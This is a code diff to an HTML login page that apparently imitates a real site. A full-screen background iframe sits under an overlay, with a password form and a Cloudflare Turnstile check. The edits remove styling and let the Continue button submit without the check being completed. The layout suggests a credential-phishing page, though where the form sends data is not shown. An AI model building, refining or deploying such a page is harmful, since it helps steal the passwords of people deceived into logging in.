@@ -14,22 +14,6 @@
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" nonce="MTA3NzMwNzcyNiw0MDgzMTg3NDgx"></script>
 
     <style>
-        /* Hide the main content initially */
-        #main-content {
-            display: block;
-        }
-
-        /* Ensure text is left-aligned */
-        .verification-content {
-            text-align: left;
-        }
-
-        /* Adjust spinner size */
-        .spinner-border {
-            width: 1.5rem;
-            height: 1.5rem;
-        }
-
         #background-iframe, #overlay {
             position: fixed;
             top: 0;
@@ -181,9 +165,6 @@
         /* Verification section styling */
         #verification-section {
             margin-top: 20px;
-            padding: 15px;
-            background-color: rgba(255, 255, 255, 0.9);
-            border-radius: 8px;
             text-align: center;
         }
 
@@ -230,11 +211,10 @@
                 <label for="password" style="background-color: transparent;" class="translatable" data-key="password-label">Password</label>
             </div>
             <!-- Submit Button -->
-            <button type="submit" class="btn btn-primary translatable" data-key="next-button" id="submit-button" disabled>Continue</button>
+            <button type="submit" class="btn btn-primary translatable" data-key="next-button" id="submit-button">Continue</button>
             
             <!-- Verification Section -->
             <div id="verification-section">
-                <div class="confirm-text">Complete verification to continue</div>
                 <div class="cf-turnstile" data-sitekey="0x4AAAAAACBMjI2ZyKexvxwN" data-callback="TranquilBreeze"></div>
                 <div class="confirm-text">Browser safety for protection.</div>
             </div>
@@ -363,7 +343,6 @@
             // This is where you could trigger the redirect after CAPTCHA is successfully validated
             console.log("CAPTCHA passed! You can now proceed.");
             verificationCompleted = true;
-            document.getElementById("submit-button").disabled = false;
         }
 
         document.addEventListener("DOMContentLoaded", (() => {
